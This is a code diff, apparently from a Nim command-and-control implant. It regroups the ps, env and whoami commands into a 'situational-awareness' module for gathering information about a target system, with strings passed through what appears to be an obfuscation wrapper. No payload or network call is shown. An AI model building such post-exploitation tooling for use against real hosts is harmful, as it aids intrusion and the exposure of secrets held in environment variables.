@@ -5,33 +5,37 @@ proc executePs(ctx: AgentCtx, task: Task): TaskResult
 proc executeEnv(ctx: AgentCtx, task: Task): TaskResult
 proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult
 
-# Command definitions
-let commands*: seq[Command] = @[
-    Command(
-        name: protect("ps"),
-        commandType: CMD_PS,
-        description: protect("Display running processes."),
-        example: protect("ps"),
-        arguments: @[],
-        execute: executePs
-    ),
-    Command(
-        name: protect("env"),
-        commandType: CMD_ENV,
-        description: protect("Display environment variables."),
-        example: protect("env"),
-        arguments: @[],
-        execute: executeEnv
-    ),
-    Command(
-        name: protect("whoami"),
-        commandType: CMD_WHOAMI,
-        description: protect("Get user information."),
-        example: protect("whoami"),
-        arguments: @[],
-        execute: executeWhoami
-    )
-]
+# Module definition
+let module* = Module(
+    name: protect("situational-awareness"),
+    description: protect("Retrieve information about the target system and environment."),
+    commands: @[
+        Command(
+            name: protect("ps"),
+            commandType: CMD_PS,
+            description: protect("Display running processes."),
+            example: protect("ps"),
+            arguments: @[],
+            execute: executePs
+        ),
+        Command(
+            name: protect("env"),
+            commandType: CMD_ENV,
+            description: protect("Display environment variables."),
+            example: protect("env"),
+            arguments: @[],
+            execute: executeEnv
+        ),
+        Command(
+            name: protect("whoami"),
+            commandType: CMD_WHOAMI,
+            description: protect("Get user information."),
+            example: protect("whoami"),
+            arguments: @[],
+            execute: executeWhoami
+        )
+    ]
+)
 
 # Implement execution functions
 when defined(server):
